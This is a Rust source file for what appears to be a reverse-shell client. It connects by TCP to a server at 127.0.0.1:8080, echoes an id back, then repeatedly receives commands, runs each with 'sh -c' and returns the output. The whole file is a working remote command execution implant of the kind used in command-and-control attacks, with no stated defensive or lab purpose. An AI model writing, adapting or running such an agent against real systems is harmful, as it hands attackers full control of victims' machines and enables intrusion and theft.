use tokio::net::TcpStream;
use tokio::io::{AsyncWriteExt, AsyncReadExt};
use std::error::Error;
use tokio::time::Duration;
use std::process::Command;

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    let address = "127.0.0.1:8080";
    let socket = TcpStream::connect(address).await?;
    let mut socket = socket;

    // reading the id
    let mut response = vec![0; 1024];
    let n = socket.read(&mut response).await?;
    println!("Received2: {}", String::from_utf8_lossy(&response[..n]));
    socket.write_all(&response).await?;
    tokio::time::sleep(Duration::from_secs(5)).await;


    loop {
        let mut command_buffer = vec![0; 1024];
        let n = socket.read(&mut command_buffer).await?;

        let command = String::from_utf8_lossy(&command_buffer[..n]).trim().to_string();
        println!("Received command from server: {}", command);

        let find_output = Command::new("sh")
        .arg("-c")
        .arg(&command)
        .output()
        .expect("Failed to execute command");

        socket.write_all(&find_output.stdout).await?;
        let message = "done";
        socket.write_all(message.as_bytes()).await?;

        tokio::time::sleep(Duration::from_secs(5)).await;
    }
}
